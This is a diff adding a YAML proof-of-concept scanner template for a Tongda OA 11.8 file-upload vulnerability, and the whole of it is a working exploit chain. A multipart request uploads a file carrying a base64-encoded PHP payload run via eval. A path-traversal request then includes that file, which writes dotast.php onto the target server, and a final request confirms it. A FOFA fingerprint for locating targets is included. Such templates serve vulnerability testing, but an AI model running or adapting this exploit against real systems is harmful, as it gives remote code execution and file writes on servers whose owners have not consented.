@@ -1,0 +1,47 @@
+id: poc-yaml-tongda-office-anywhere-11.8-api.php-file-upload
+info:
+  name: 通达OA11.8-api-ali.php文件上传漏洞
+  severity: critical
+  tags:
+  - 两高一弱
+  - 文件上传
+  finger: tongda_oa
+  fofa: app="TDXK-通达OA"
+variables:
+  t1: datetime("0601")
+  filename: random_str(6)
+requests:
+- method: POST
+  path: /mobile/api/api.ali.php
+  headers:
+    Content-Type: multipart/form-data;boundary=c95f01744a86a8923cdf0e2b538a850d
+  data: '--c95f01744a86a8923cdf0e2b538a850d
+
+    Content-Disposition: form-data; name="file"; filename="{{.filename}}.json"
+
+    Content-Type: application/octet-stream
+
+
+    {"modular":"AllVariable","dotast":"ZmlsZV9wdXRfY29udGVudHMoJy4uLy4uL2RvdGFzdC5waHAnLCc8P3BocCBlY2hvICIhISEhIXZ1bG5lcmFiaWxpdHkgdGVzdCB3YXMgc3VjY2Vzc2Z1bEBAQEBAIjs/PicpOw==","dataAnalysis":"{\"abc\":\"覾'',eval(base64_decode($BackData[dotast])));/*\"}"}
+
+    --c95f01744a86a8923cdf0e2b538a850d--'
+  expression: 'status_code == 200 &&
+
+    contains(content_type,"")
+
+    '
+- method: GET
+  path: /inc/package/work.php?id=../../../../../myoa/attach/approve_center/{{.t1}}/%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E.{{.filename}}
+  expression: 'status_code == 200 &&
+
+    contains(body,"+OK")
+
+    '
+- method: GET
+  path: /dotast.php
+  expression: 'status_code == 200 &&
+
+    contains(body,"!!!!!vulnerability test was successful@@@@@")
+
+    '
+transport: http
